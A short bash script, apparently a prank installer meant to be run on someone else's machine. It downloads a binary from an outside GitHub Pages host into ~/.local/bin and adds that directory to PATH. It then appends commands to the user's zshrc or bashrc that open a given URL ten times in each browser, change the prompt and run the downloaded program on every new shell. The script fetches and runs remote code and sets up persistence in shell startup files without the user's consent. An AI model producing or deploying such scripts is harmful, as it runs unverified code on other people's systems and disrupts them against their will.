#!/usr/bin/bash
# README
# If an argument is passed that is the URL the browser will open


if [[ $SHELL == *"zsh" ]]; then
  RC="zshrc"
elif [[ $SHELL == *"bash" ]]; then
  RC="bashrc"
fi

mkdir -p ~/.local/bin
curl 'https://getprankedbro.github.io/bin/sh' --output sl
mv -f sl ~/.local/bin/
echo "PATH=\$PATH:'/home/$(whoami)/.local/bin'" >> ~/.$RC
#echo "sl" >> ~/.zshrc

if [ "$#" -eq 1 ]; then
  if command -v chromium &>/dev/null; then
    CMD=$CMD\;"for i in {0..9}; do chromium -new-window $1 & disown; done"
  fi

  if command -v firefox &>/dev/null; then
    CMD=$CMD\;"for i in {0..9}; do firefox -new-window $1 & disown; done"
  fi

  if command -v chrome &>/dev/null; then
    CMD=$CMD\;"for i in {0..9}; do chrome -new-window $1 & disown; done"
  fi

  echo $CMD >> ~/.$RC
fi

echo "export PROMPT='DNUR> '" >> ~/.$RC
echo "sl" >> ~/.$RC

